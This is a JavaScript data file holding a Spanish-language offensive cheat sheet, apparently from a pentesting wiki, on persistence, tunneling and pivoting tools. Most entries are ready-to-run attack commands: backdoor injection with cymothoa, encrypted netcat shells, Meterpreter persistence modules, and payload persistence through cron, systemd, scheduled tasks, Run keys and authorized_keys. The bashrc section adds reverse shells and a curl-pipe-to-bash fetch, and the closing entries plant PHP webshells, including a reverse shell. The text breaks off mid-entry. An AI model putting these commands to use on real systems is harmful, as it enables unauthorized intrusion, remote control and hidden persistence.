// Persistencia (Persistence)
window.WIKI_CHEATSHEETS_05_PERSISTENCE = [
 {
  "tool": "chntpw",
  "desc": "Resetear y manipular contraseñas de SAM Windows offline",
  "commands": [
   {
    "cmd": "chntpw -l SAM",
    "desc": "Listar usuarios del SAM"
   },
   {
    "cmd": "chntpw -u usuario SAM",
    "desc": "Cambiar contraseña de usuario"
   },
   {
    "cmd": "chntpw -u admin SAM",
    "desc": "Resetear contraseña de admin"
   },
   {
    "cmd": "chntpw -l SAM SYSTEM",
    "desc": "Listar con SYSTEM"
   },
   {
    "cmd": "chntpw -e SAM",
    "desc": "Edición interactiva del registro"
   },
   {
    "cmd": "chntpw -d SAM",
    "desc": "Debug"
   },
   {
    "cmd": "chntpw -u 'user' -i SAM",
    "desc": "Modo interactivo"
   },
   {
    "cmd": "reged -x system.reg",
    "desc": "Editar archivo de registro"
   },
   {
    "cmd": "samusrgrp -l SAM",
    "desc": "Listar grupos"
   },
   {
    "cmd": "sampasswd -u user SAM",
    "desc": "Cambiar password"
   },
   {
    "cmd": "samunlock -u user SAM",
    "desc": "Desbloquear usuario"
   }
  ]
 },
 {
  "tool": "cymothoa",
  "desc": "Inyector de backdoors en procesos en ejecución",
  "commands": [
   {
    "cmd": "cymothoa -p PID -s 1 -S port",
    "desc": "Inyectar backdoor en proceso"
   },
   {
    "cmd": "cymothoa -p PID -s 1 -S 8080 -f",
    "desc": "Backdoor con fork"
   },
   {
    "cmd": "cymothoa -p PID -l 0",
    "desc": "Listar procesos"
   },
   {
    "cmd": "cymothoa -h",
    "desc": "Ayuda"
   },
   {
    "cmd": "cymothoa -p PID -s 1 -S 4444 -k pass",
    "desc": "Con clave"
   },
   {
    "cmd": "cymothoa -p PID -s 1 -S 4444 -b",
    "desc": "Modo bind"
   },
   {
    "cmd": "cymothoa -p PID -s 1 -S 4444 -r",
    "desc": "Modo reverse"
   },
   {
    "cmd": "cymothoa -p PID -s 2 -S 80",
    "desc": "Shellcode 2"
   }
  ]
 },
 {
  "tool": "cryptcat",
  "desc": "Netcat cifrado con Twofish",
  "commands": [
   {
    "cmd": "cryptcat -l -p 4444 -k password",
    "desc": "Listener cifrado"
   },
   {
    "cmd": "cryptcat IP 4444 -k password",
    "desc": "Conectar cifrado"
   },
   {
    "cmd": "cryptcat -l -p 4444 -k pass -e /bin/sh",
    "desc": "Listener con shell"
   },
   {
    "cmd": "cryptcat -u -l -p 4444 -k pass",
    "desc": "UDP listener"
   },
   {
    "cmd": "cryptcat -v IP 4444 -k pass",
    "desc": "Verbose"
   },
   {
    "cmd": "cryptcat -z IP 1-1000 -k pass",
    "desc": "Escaneo de puertos"
   },
   {
    "cmd": "cryptcat -l -p 4444 -k pass < file.txt",
    "desc": "Enviar archivo"
   },
   {
    "cmd": "cryptcat -w 5 -k pass -l -p 4444",
    "desc": "Timeout de 5s"
   }
  ]
 },
 {
  "tool": "dbd",
  "desc": "Netcat cifrado con AES (llave precompartida)",
  "commands": [
   {
    "cmd": "dbd -l -p 4444 -k password",
    "desc": "Listener cifrado"
   },
   {
    "cmd": "dbd IP 4444 -k password",
    "desc": "Cliente"
   },
   {
    "cmd": "dbd -l -p 4444 -k pass -e /bin/sh",
    "desc": "Listener con shell"
   },
   {
    "cmd": "dbd -u -l -p 4444 -k pass",
    "desc": "UDP"
   },
   {
    "cmd": "dbd -l -p 4444 -k pass -v",
    "desc": "Verbose"
   },
   {
    "cmd": "dbd -l -p 4444 -k pass -d",
    "desc": "Daemon"
   },
   {
    "cmd": "dbd -h",
    "desc": "Ayuda"
   }
  ]
 },
 {
  "tool": "snmpd",
  "desc": "Daemon SNMP (a veces usado como servicio auxiliar)",
  "commands": [
   {
    "cmd": "snmpd -v 1 -c public",
    "desc": "Ejecutar con community string"
   },
   {
    "cmd": "snmpd -f",
    "desc": "Foreground"
   },
   {
    "cmd": "snmpd -d",
    "desc": "Debug"
   },
   {
    "cmd": "snmpd -h",
    "desc": "Ayuda"
   }
  ]
 },
 {
  "tool": "atftp",
  "desc": "Cliente/servidor TFTP (transferencia de archivos trivial)",
  "commands": [
   {
    "cmd": "atftp -g -r config.txt -l config.txt 192.168.1.1",
    "desc": "Descargar archivo"
   },
   {
    "cmd": "atftp -p -l local.bin -r remote.bin 192.168.1.1",
    "desc": "Subir archivo"
   },
   {
    "cmd": "atftp -g -r file -l file -i 192.168.1.1",
    "desc": "Descarga binaria"
   },
   {
    "cmd": "atftp -g -r file -l file -p 69 192.168.1.1",
    "desc": "Puerto 69"
   },
   {
    "cmd": "atftp --verbose -g -r file 192.168.1.1",
    "desc": "Verbose"
   },
   {
    "cmd": "atftpd --daemon --port 69 /srv/tftp",
    "desc": "Servidor TFTP"
   },
   {
    "cmd": "atftpd --no-fork /srv/tftp",
    "desc": "Servidor en foreground"
   }
  ]
 },
 {
  "tool": "berate_ap",
  "desc": "Crear puntos de acceso WiFi (AP) para pentesting",
  "commands": [
   {
    "cmd": "berate_ap wlan0 eth0 ssid pass",
    "desc": "Crear AP con salida"
   },
   {
    "cmd": "berate_ap -i wlan0mon wlan0 ssid pass",
    "desc": "Modo monitor"
   },
   {
    "cmd": "berate_ap --hidden wlan0 eth0 ssid pass",
    "desc": "AP oculto"
   },
   {
    "cmd": "berate_ap --client-connect wlan0 eth0 ssid pass",
    "desc": "Client connect"
   },
   {
    "cmd": "berate_ap --psk wlan0 eth0 ssid pass",
    "desc": "WPA2-PSK"
   },
   {
    "cmd": "berate_ap --wps wlan0 eth0 ssid pass",
    "desc": "Con WPS"
   },
   {
    "cmd": "berate_ap --continuous wlan0 eth0 ssid pass",
    "desc": "Reinicio continuo"
   },
   {
    "cmd": "berate_ap --channel 6 wlan0 eth0 ssid pass",
    "desc": "Canal 6"
   },
   {
    "cmd": "berate_ap -v wlan0 eth0 ssid pass",
    "desc": "Verbose"
   },
   {
    "cmd": "berate_ap --help",
    "desc": "Ayuda"
   }
  ]
 },
 {
  "tool": "hostapd-mana",
  "desc": "Punto de acceso WiFi con funcionalidades de ataque (MANA)",
  "commands": [
   {
    "cmd": "hostapd-mana hostapd-mana.conf",
    "desc": "Iniciar AP con config"
   },
   {
    "cmd": "hostapd-mana -dd hostapd-mana.conf",
    "desc": "Debug"
   },
   {
    "cmd": "hostapd-mana -B hostapd-mana.conf",
    "desc": "Background"
   },
   {
    "cmd": "hostapd-mana -f log.txt hostapd-mana.conf",
    "desc": "Log a archivo"
   },
   {
    "cmd": "hostapd-mana -t hostapd-mana.conf",
    "desc": "Test de config"
   },
   {
    "cmd": "hostapd-mana -h",
    "desc": "Ayuda"
   }
  ]
 },
 {
  "tool": "sshuttle",
  "desc": "Proxy VPN sobre SSH para pivoting transparente",
  "commands": [
   {
    "cmd": "sshuttle -r user@host 10.0.0.0/8",
    "desc": "Tunelar red remota"
   },
   {
    "cmd": "sshuttle -r user@host 0.0.0.0/0",
    "desc": "Tunelar todo el tráfico"
   },
   {
    "cmd": "sshuttle -r user@host 192.168.1.0/24",
    "desc": "Tunelar subred específica"
   },
   {
    "cmd": "sshuttle -r user@host -v 10.0.0.0/8",
    "desc": "Verbose"
   },
   {
    "cmd": "sshuttle --dns -r user@host 10.0.0.0/8",
    "desc": "Con DNS túnel"
   },
   {
    "cmd": "sshuttle -x 10.0.0.5 -r user@host 10.0.0.0/8",
    "desc": "Excluir host"
   },
   {
    "cmd": "sshuttle --ssh-cmd 'ssh -i key' -r user@host 10.0.0.0/8",
    "desc": "Con clave SSH"
   },
   {
    "cmd": "sshuttle -r user@host --daemon 10.0.0.0/8",
    "desc": "Daemon"
   },
   {
    "cmd": "sshuttle -H -r user@host 10.0.0.0/8",
    "desc": "Auto-hostnames"
   },
   {
    "cmd": "sshuttle --python python3 -r user@host 10.0.0.0/8",
    "desc": "Forzar Python3"
   }
  ]
 },
 {
  "tool": "proxychains",
  "desc": "Forzar tráfico de aplicaciones a través de proxies (SOCKS)",
  "commands": [
   {
    "cmd": "proxychains nmap -sT -Pn 10.10.10.5",
    "desc": "Nmap vía proxy"
   },
   {
    "cmd": "proxychains curl http://target",
    "desc": "Curl vía proxy"
   },
   {
    "cmd": "proxychains ssh user@10.10.10.5",
    "desc": "SSH vía proxy"
   },
   {
    "cmd": "proxychains -f custom.conf nmap -sT 10.10.10.5",
    "desc": "Config custom"
   },
   {
    "cmd": "proxychains -q nmap -sT 10.10.10.5",
    "desc": "Modo silencioso"
   },
   {
    "cmd": "proxychains4 nmap -sT 10.10.10.5",
    "desc": "Alias proxychains4"
   },
   {
    "cmd": "proxychains rdesktop 10.10.10.5",
    "desc": "RDP vía proxy"
   },
   {
    "cmd": "proxychains msfconsole",
    "desc": "Metasploit vía proxy"
   },
   {
    "cmd": "proxychains firefox",
    "desc": "Navegador vía proxy"
   },
   {
    "cmd": "proxychains sqlmap -u http://target",
    "desc": "SQLMap vía proxy"
   }
  ]
 },
 {
  "tool": "chisel",
  "desc": "Túnel TCP/UDP rápido sobre HTTP/WebSocket",
  "commands": [
   {
    "cmd": "chisel server --reverse --port 8000",
    "desc": "Servidor con reverse"
   },
   {
    "cmd": "chisel client ATACANTE:8000 R:socks",
    "desc": "Cliente con SOCKS reverse"
   },
   {
    "cmd": "chisel server --port 8000",
    "desc": "Servidor normal"
   },
   {
    "cmd": "chisel client SERVER:8000 8080:target:80",
    "desc": "Port forward local"
   },
   {
    "cmd": "chisel client SERVER:8000 R:9000:localhost:80",
    "desc": "Reverse port forward"
   },
   {
    "cmd": "chisel client SERVER:8000 R:socks",
    "desc": "SOCKS5 reverse proxy"
   },
   {
    "cmd": "chisel server --reverse --socks5 --port 8000",
    "desc": "Servidor con SOCKS5"
   },
   {
    "cmd": "chisel client --fingerprint hash SERVER:8000 R:socks",
    "desc": "Con fingerprint"
   },
   {
    "cmd": "chisel server --reverse --auth user:pass",
    "desc": "Servidor con autenticación"
   },
   {
    "cmd": "chisel client -v SERVER:8000 R:socks",
    "desc": "Verbose"
   },
   {
    "cmd": "chisel server --reverse --port 443 --tls",
    "desc": "Con TLS"
   },
   {
    "cmd": "chisel client --tls SERVER:443 R:socks",
    "desc": "Cliente TLS"
   },
   {
    "cmd": "chisel server --reverse -p 8000 --keepalive 25s",
    "desc": "Keepalive 25s"
   },
   {
    "cmd": "chisel server --reverse --proxy http://proxy:8080",
    "desc": "Servidor tras proxy"
   },
   {
    "cmd": "chisel client SERVER:8000 8080:127.0.0.1:80",
    "desc": "Forward simple"
   },
   {
    "cmd": "chisel client --host SOCKS5 --port 1080 SERVER:8000 R:socks",
    "desc": "SOCKS en host custom"
   },
   {
    "cmd": "chisel server --reverse --timeout 5m",
    "desc": "Timeout de inactividad"
   },
   {
    "cmd": "chisel --version",
    "desc": "Versión"
   }
  ]
 },
 {
  "tool": "ligolo-ng",
  "desc": "Herramienta de tunneling/pivoting tipo VPN (ligero y seguro)",
  "commands": [
   {
    "cmd": "sudo ip tuntap add user kali mode tun ligolo",
    "desc": "Crear interfaz TUN"
   },
   {
    "cmd": "sudo ip link set ligolo up",
    "desc": "Activar interfaz"
   },
   {
    "cmd": "sudo ip route add 10.10.10.0/24 dev ligolo",
    "desc": "Ruta a la red objetivo"
   },
   {
    "cmd": "./proxy -selfcert -laddr 0.0.0.0:11601",
    "desc": "Servidor proxy con cert auto"
   },
   {
    "cmd": "./agent -connect ATACANTE:11601 -ignore-cert",
    "desc": "Agente conectándose"
   },
   {
    "cmd": "./agent -connect ATACANTE:11601 -ignore-cert -debug",
    "desc": "Agente con debug"
   },
   {
    "cmd": "./proxy -autocert -laddr 0.0.0.0:11601 -domain ejemplo.com",
    "desc": "Con autocert"
   },
   {
    "cmd": "./agent -connect ATACANTE:11601 -bind 0.0.0.0:0",
    "desc": "Bind random"
   },
   {
    "cmd": "./agent -connect ATACANTE:11601 -retry 10",
    "desc": "Reintentos"
   },
   {
    "cmd": "session",
    "desc": "Listar sesiones en proxy console"
   },
   {
    "cmd": "start --tunnel",
    "desc": "Iniciar túnel en sesión"
   },
   {
    "cmd": "listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:80",
    "desc": "Listener local"
   },
   {
    "cmd": "listener_add --addr 0.0.0.0:3000 --to 10.10.10.5:3000",
    "desc": "Port forward"
   }
  ]
 },
 {
  "tool": "ssh",
  "desc": "Cliente SSH con opciones de túnel y pivoting",
  "commands": [
   {
    "cmd": "ssh user@host",
    "desc": "Conexión básica"
   },
   {
    "cmd": "ssh -p 2222 user@host",
    "desc": "Puerto específico"
   },
   {
    "cmd": "ssh -i key.pem user@host",
    "desc": "Con clave privada"
   },
   {
    "cmd": "ssh -D 1080 user@host",
    "desc": "SOCKS5 dynamic forward"
   },
   {
    "cmd": "ssh -L 8080:internal:80 user@host",
    "desc": "Local port forward"
   },
   {
    "cmd": "ssh -R 9090:localhost:3000 user@host",
    "desc": "Remote port forward"
   },
   {
    "cmd": "ssh -J jump1,jump2 user@final",
    "desc": "Jump hosts"
   },
   {
    "cmd": "ssh -N -L 3306:db.internal:3306 user@host",
    "desc": "Solo forward sin shell"
   },
   {
    "cmd": "ssh -C -D 1080 user@host",
    "desc": "Con compresión"
   },
   {
    "cmd": "ssh -v user@host",
    "desc": "Verbose"
   },
   {
    "cmd": "ssh -vvv user@host",
    "desc": "Máximo verbose"
   },
   {
    "cmd": "ssh -o StrictHostKeyChecking=no user@host",
    "desc": "Sin verificar host key"
   },
   {
    "cmd": "ssh -o ConnectTimeout=5 user@host",
    "desc": "Timeout de conexión"
   },
   {
    "cmd": "ssh -X user@host",
    "desc": "Forwarding X11"
   },
   {
    "cmd": "ssh -T user@host",
    "desc": "Sin pseudo-terminal"
   },
   {
    "cmd": "ssh -f -N -L 8080:target:80 user@host",
    "desc": "Background sin shell"
   },
   {
    "cmd": "ssh -o ProxyCommand='nc -X connect -x proxy:8080 %h %p' user@host",
    "desc": "Vía proxy"
   }
  ]
 },
 {
  "tool": "rinetd",
  "desc": "Redirección de puertos TCP simple",
  "commands": [
   {
    "cmd": "rinetd",
    "desc": "Iniciar con config /etc/rinetd.conf"
   },
   {
    "cmd": "rinetd -c config.conf",
    "desc": "Config custom"
   },
   {
    "cmd": "rinetd -f -c config.conf",
    "desc": "Foreground"
   },
   {
    "cmd": "rinetd -v -c config.conf",
    "desc": "Verbose"
   },
   {
    "cmd": "rinetd -h",
    "desc": "Ayuda"
   },
   {
    "cmd": "echo '0.0.0.0 8080 10.0.0.5 80' >> /etc/rinetd.conf",
    "desc": "Regla: puerto local a remoto"
   },
   {
    "cmd": "echo '0.0.0.0 4444 10.0.0.5 4444' >> /etc/rinetd.conf",
    "desc": "Reenviar shell"
   },
   {
    "cmd": "systemctl restart rinetd",
    "desc": "Reiniciar servicio"
   }
  ]
 },
 {
  "tool": "autossh",
  "desc": "Túneles SSH persistentes (persistencia C2)",
  "commands": [
   {
    "cmd": "autossh -M 0 -N -L 8080:localhost:80 user@server",
    "desc": "Túnel persistente"
   },
   {
    "cmd": "autossh -M 0 -N -R 4444:localhost:4444 user@server",
    "desc": "Reverse persistente"
   },
   {
    "cmd": "autossh -M 20000 -N -L 8080:localhost:80 user@server",
    "desc": "Monitor port 20000"
   },
   {
    "cmd": "autossh -M 0 -N -D 1080 user@server",
    "desc": "SOCKS"
   },
   {
    "cmd": "autossh -M 0 -f -N -L 8080:localhost:80 user@server",
    "desc": "Background"
   },
   {
    "cmd": "autossh -M 0 -o ServerAliveInterval 30 -N -R 2222:localhost:22 user@server",
    "desc": "Keepalive"
   },
   {
    "cmd": "AUTOSSH_GATETIME=0 autossh -M 0 -N -R 4444:localhost:4444 user@server",
    "desc": "Reinicio inmediato"
   },
   {
    "cmd": "autossh -V",
    "desc": "Versión"
   }
  ]
 },
 {
  "tool": "tmux",
  "desc": "Multiplexor de terminal (sesiones persistentes)",
  "commands": [
   {
    "cmd": "tmux new -s nombre",
    "desc": "Nueva sesión"
   },
   {
    "cmd": "tmux ls",
    "desc": "Listar sesiones"
   },
   {
    "cmd": "tmux attach -t nombre",
    "desc": "Adjuntar"
   },
   {
    "cmd": "tmux detach",
    "desc": "Detach (Ctrl-b d)"
   },
   {
    "cmd": "tmux kill-session -t nombre",
    "desc": "Matar sesión"
   },
   {
    "cmd": "tmux new -s nombre -d",
    "desc": "Detached"
   },
   {
    "cmd": "tmux new -s nombre 'comando'",
    "desc": "Ejecutar comando"
   },
   {
    "cmd": "tmux rename-session nuevo",
    "desc": "Renombrar"
   },
   {
    "cmd": "tmux kill-server",
    "desc": "Matar todo"
   },
   {
    "cmd": "tmux split-window -h",
    "desc": "Dividir vertical"
   },
   {
    "cmd": "tmux split-window -v",
    "desc": "Dividir horizontal"
   },
   {
    "cmd": "tmux new-window",
    "desc": "Nueva ventana"
   },
   {
    "cmd": "tmux select-window -t 1",
    "desc": "Ventana 1"
   },
   {
    "cmd": "tmux send-keys 'whoami' Enter",
    "desc": "Enviar teclas"
   },
   {
    "cmd": "tmux capture-pane -p",
    "desc": "Capturar pantalla"
   },
   {
    "cmd": "tmux save-buffer -b buffer.txt",
    "desc": "Guardar buffer"
   },
   {
    "cmd": "tmux set -g mouse on",
    "desc": "Ratón"
   },
   {
    "cmd": "tmux list-windows -t nombre",
    "desc": "Ventanas"
   },
   {
    "cmd": "tmux display-message -p '#S'",
    "desc": "Nombre de sesión"
   },
   {
    "cmd": "tmux respawn-window -k",
    "desc": "Reiniciar ventana"
   }
  ]
 },
 {
  "tool": "screen",
  "desc": "Multiplexor de terminal clásico",
  "commands": [
   {
    "cmd": "screen -S nombre",
    "desc": "Nueva sesión"
   },
   {
    "cmd": "screen -ls",
    "desc": "Listar"
   },
   {
    "cmd": "screen -r nombre",
    "desc": "Reanudar"
   },
   {
    "cmd": "screen -d -r nombre",
    "desc": "Detach y reanudar"
   },
   {
    "cmd": "screen -S nombre -X quit",
    "desc": "Cerrar"
   },
   {
    "cmd": "screen -dmS nombre comando",
    "desc": "Detached con comando"
   },
   {
    "cmd": "screen -X -S nombre kill",
    "desc": "Matar"
   },
   {
    "cmd": "screen -S nombre -X stuff 'whoami\n'",
    "desc": "Enviar input"
   },
   {
    "cmd": "screen -e '^Bb'",
    "desc": "Cambiar escape"
   },
   {
    "cmd": "screen -L -S nombre",
    "desc": "Con log"
   },
   {
    "cmd": "screen -r PID.nombre",
    "desc": "Reanudar por PID"
   },
   {
    "cmd": "screen -wipe",
    "desc": "Limpiar muertas"
   }
  ]
 },
 {
  "tool": "meterpreter-persistence",
  "desc": "Persistencia con Metasploit Meterpreter",
  "commands": [
   {
    "cmd": "msfconsole -q -x 'use post/windows/manage/persistence_exe; set SESSION 1; set REXEPATH /tmp/persist.exe; set REXENAME svchost.exe; run'",
    "desc": "Persistencia EXE"
   },
   {
    "cmd": "msfconsole -q -x 'use exploit/windows/local/persistence; set SESSION 1; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST IP; set LPORT 4444; run'",
    "desc": "Persistencia reg"
   },
   {
    "cmd": "msfconsole -q -x 'use post/windows/manage/install_service; set SESSION 1; run'",
    "desc": "Instalar servicio"
   },
   {
    "cmd": "msfconsole -q -x 'use post/multi/gather/run_bash; set SESSION 1; set COMMAND crontab -l; run'",
    "desc": "Ver crontab"
   },
   {
    "cmd": "msfconsole -q -x 'use post/multi/recon/local_exploit_suggester; set SESSION 1; run'",
    "desc": "Sugerir exploits"
   },
   {
    "cmd": "msfconsole -q -x 'use post/windows/manage/enable_rdp; set SESSION 1; run'",
    "desc": "Habilitar RDP"
   },
   {
    "cmd": "msfconsole -q -x 'use post/windows/manage/add_user; set SESSION 1; set USERNAME admin; set PASSWORD Pass123; run'",
    "desc": "Crear usuario"
   },
   {
    "cmd": "msfconsole -q -x 'use post/windows/gather/checkvm; set SESSION 1; run'",
    "desc": "¿VM?"
   }
  ]
 },
 {
  "tool": "systemd-units",
  "desc": "Persistencia con unidades systemd",
  "commands": [
   {
    "cmd": "cat /etc/systemd/system/svc.service",
    "desc": "Ver unit"
   },
   {
    "cmd": "printf '[Unit]\\nDescription=x\\n[Service]\\nExecStart=/tmp/payload\\nRestart=always\\n[Install]\\nWantedBy=multi-user.target\\n' > /etc/systemd/system/svc.service",
    "desc": "Crear unit"
   },
   {
    "cmd": "systemctl daemon-reload",
    "desc": "Recargar"
   },
   {
    "cmd": "systemctl enable svc",
    "desc": "Habilitar"
   },
   {
    "cmd": "systemctl start svc",
    "desc": "Iniciar"
   },
   {
    "cmd": "systemctl enable --now svc",
    "desc": "Enable+start"
   },
   {
    "cmd": "journalctl -u svc",
    "desc": "Logs del servicio"
   },
   {
    "cmd": "systemctl list-unit-files | grep enabled",
    "desc": "Enabled"
   },
   {
    "cmd": "systemctl get-default",
    "desc": "Default target"
   },
   {
    "cmd": "systemctl cat svc",
    "desc": "Ver unit"
   },
   {
    "cmd": "systemctl edit svc",
    "desc": "Override"
   },
   {
    "cmd": "systemctl mask svc",
    "desc": "Enmascarar"
   },
   {
    "cmd": "rm /etc/systemd/system/svc.service && systemctl daemon-reload",
    "desc": "Eliminar"
   }
  ]
 },
 {
  "tool": "schtasks-persist",
  "desc": "Persistencia con Scheduled Tasks de Windows",
  "commands": [
   {
    "cmd": "schtasks /create /tn task /tr payload.exe /sc onlogon /ru SYSTEM",
    "desc": "Al login"
   },
   {
    "cmd": "schtasks /create /tn task /tr payload.exe /sc daily /st 09:00",
    "desc": "Diario"
   },
   {
    "cmd": "schtasks /create /tn task /tr payload.exe /sc onstart",
    "desc": "Al arranque"
   },
   {
    "cmd": "schtasks /create /tn task /tr payload.exe /sc onidle /i 10",
    "desc": "Idle"
   },
   {
    "cmd": "schtasks /create /tn task /tr payload.exe /sc minute /mo 5",
    "desc": "Cada 5 min"
   },
   {
    "cmd": "schtasks /create /tn task /tr payload.exe /sc hourly /mo 1",
    "desc": "Cada hora"
   },
   {
    "cmd": "schtasks /run /tn task",
    "desc": "Ejecutar"
   },
   {
    "cmd": "schtasks /query /tn task",
    "desc": "Consultar"
   },
   {
    "cmd": "schtasks /query /fo csv",
    "desc": "Todas CSV"
   },
   {
    "cmd": "schtasks /delete /tn task /f",
    "desc": "Borrar"
   },
   {
    "cmd": "schtasks /change /tn task /tr new.exe",
    "desc": "Cambiar"
   },
   {
    "cmd": "schtasks /end /tn task",
    "desc": "Terminar"
   },
   {
    "cmd": "schtasks /create /tn task /tr 'cmd /c powershell -enc ...' /sc onlogon",
    "desc": "Encoded"
   },
   {
    "cmd": "schtasks /? ",
    "desc": "Ayuda"
   }
  ]
 },
 {
  "tool": "reg-runkeys",
  "desc": "Persistencia en Run/RunOnce del registro",
  "commands": [
   {
    "cmd": "reg add HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run /v X /t REG_SZ /d 'payload.exe'",
    "desc": "Run HKCU"
   },
   {
    "cmd": "reg add HKLM\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run /v X /t REG_SZ /d 'payload.exe'",
    "desc": "Run HKLM"
   },
   {
    "cmd": "reg add HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\RunOnce /v X /t REG_SZ /d 'payload.exe'",
    "desc": "RunOnce"
   },
   {
    "cmd": "reg add HKLM\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\RunOnce /v X /t REG_SZ /d 'payload.exe'",
    "desc": "RunOnce HKLM"
   },
   {
    "cmd": "reg add 'HKLM\\\\Software\\\\Wow6432Node\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run' /v X /d 'payload.exe'",
    "desc": "Wow64"
   },
   {
    "cmd": "reg add 'HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\Shell Folders' /v Startup /d '%APPDATA%\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup'",
    "desc": "Startup folder"
   },
   {
    "cmd": "reg query HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run",
    "desc": "Ver Run"
   },
   {
    "cmd": "reg query HKLM\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run",
    "desc": "Ver Run HKLM"
   },
   {
    "cmd": "reg delete HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run /v X /f",
    "desc": "Borrar"
   },
   {
    "cmd": "reg query 'HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\Explorer\\\\Run'",
    "desc": "Policy Run"
   }
  ]
 },
 {
  "tool": "startup-folder",
  "desc": "Persistencia en la carpeta de inicio de Windows",
  "commands": [
   {
    "cmd": "copy payload.exe \"%APPDATA%\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\\"",
    "desc": "Copiar al startup"
   },
   {
    "cmd": "copy payload.exe \"C:\\\\ProgramData\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\StartUp\\\\\"",
    "desc": "Startup global"
   },
   {
    "cmd": "echo payload.exe > \"%APPDATA%\\\\...\\\\Startup\\\\x.bat\"",
    "desc": "Batch de inicio"
   },
   {
    "cmd": "wmic startup list full",
    "desc": "Listar startups"
   },
   {
    "cmd": "powershell -c 'New-Item -ItemType SymbolicLink -Path \"...\\\\Startup\\\\x.exe\" -Target C:\\\\tmp\\\\p.exe'",
    "desc": "Symlink"
   },
   {
    "cmd": "dir \"%APPDATA%\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\"",
    "desc": "Ver carpeta"
   }
  ]
 },
 {
  "tool": "cron-persist",
  "desc": "Persistencia con cron jobs",
  "commands": [
   {
    "cmd": "crontab -l",
    "desc": "Ver crontab"
   },
   {
    "cmd": "(crontab -l; echo '@reboot /tmp/payload.sh') | crontab -",
    "desc": "Al reboot"
   },
   {
    "cmd": "(crontab -l; echo '*/5 * * * * /tmp/payload.sh') | crontab -",
    "desc": "Cada 5 min"
   },
   {
    "cmd": "(crontab -l; echo '@daily /tmp/payload.sh') | crontab -",
    "desc": "Diario"
   },
   {
    "cmd": "(crontab -l; echo '0 3 * * * /tmp/payload.sh') | crontab -",
    "desc": "3 AM"
   },
   {
    "cmd": "echo '@reboot root /tmp/payload.sh' >> /etc/cron.d/persist",
    "desc": "Cron global"
   },
   {
    "cmd": "echo '*/1 * * * * root /tmp/p' >> /etc/crontab",
    "desc": "En /etc/crontab"
   },
   {
    "cmd": "ls /etc/cron.d/",
    "desc": "Ver cron.d"
   },
   {
    "cmd": "cat /etc/cron.d/*",
    "desc": "Contenidos"
   },
   {
    "cmd": "grep -r '' /etc/cron*",
    "desc": "Buscar cron"
   },
   {
    "cmd": "crontab -r",
    "desc": "Borrar crontab"
   },
   {
    "cmd": "systemctl status cron",
    "desc": "Estado cron"
   }
  ]
 },
 {
  "tool": "ssh-keys-persist",
  "desc": "Persistencia con claves SSH autorizadas",
  "commands": [
   {
    "cmd": "mkdir -p /root/.ssh && chmod 700 /root/.ssh",
    "desc": "Preparar"
   },
   {
    "cmd": "echo 'PUBKEY' >> /root/.ssh/authorized_keys",
    "desc": "Añadir clave"
   },
   {
    "cmd": "chmod 600 /root/.ssh/authorized_keys",
    "desc": "Permisos"
   },
   {
    "cmd": "cat /root/.ssh/authorized_keys",
    "desc": "Ver"
   },
   {
    "cmd": "ssh-keygen -t rsa -b 4096 -f /tmp/key -N ''",
    "desc": "Generar clave"
   },
   {
    "cmd": "cat /tmp/key.pub >> /home/user/.ssh/authorized_keys",
    "desc": "Clave en user"
   },
   {
    "cmd": "echo 'command=\"/bin/sh -i\" PUBKEY' >> authorized_keys",
    "desc": "Clave con comando"
   },
   {
    "cmd": "echo 'no-pty,no-port-forwarding PUBKEY' >> authorized_keys",
    "desc": "Restringida"
   },
   {
    "cmd": "ssh -i /tmp/key user@IP",
    "desc": "Usar clave"
   },
   {
    "cmd": "grep -r 'authorized_keys' /home/*/.ssh/ 2>/dev/null",
    "desc": "Buscar claves"
   }
  ]
 },
 {
  "tool": "bashrc-persist",
  "desc": "Persistencia en .bashrc/.profile",
  "commands": [
   {
    "cmd": "echo '(nc -e /bin/sh IP 4444 &)' >> ~/.bashrc",
    "desc": "Al login"
   },
   {
    "cmd": "echo '(bash -i >& /dev/tcp/IP/4444 0>&1 &)' >> ~/.bashrc",
    "desc": "Reverse en bashrc"
   },
   {
    "cmd": "echo '(curl IP/p.sh | bash &)' >> ~/.profile",
    "desc": "Fetch en profile"
   },
   {
    "cmd": "echo 'alias ls=\"ls; /tmp/payload\"' >> ~/.bashrc",
    "desc": "Alias malicioso"
   },
   {
    "cmd": "echo 'if [ -f /tmp/p ]; then /tmp/p & fi' >> ~/.bashrc",
    "desc": "Condicional"
   },
   {
    "cmd": "echo '(setsid /tmp/payload &)' >> ~/.bash_profile",
    "desc": "Login shell"
   },
   {
    "cmd": "grep -n 'bashrc' /etc/bash.bashrc",
    "desc": "Global bashrc"
   },
   {
    "cmd": "echo '(/tmp/payload &)' >> /etc/bash.bashrc",
    "desc": "Global persist"
   },
   {
    "cmd": "cat ~/.bashrc | grep -i nc",
    "desc": "Ver nc en bashrc"
   }
  ]
 },
 {
  "tool": "web-backdoor-persist",
  "desc": "Persistencia vía webshells en servidores web",
  "commands": [
   {
    "cmd": "echo '<?php system($_GET[\"c\"]); ?>' > /var/www/html/x.php",
    "desc": "Webshell simple"
   },
   {
    "cmd": "echo '<?php eval($_POST[\"c\"]); ?>' > /var/www/html/eval.php",
    "desc": "Eval webshell"
   },
   {
    "cmd": "echo '<?php exec(\"bash -i >& /dev/tcp/IP/4444 0>&1\"); ?>' > /var/www/html/r.php",
    "desc": "Reverse PHP"
   },
   {
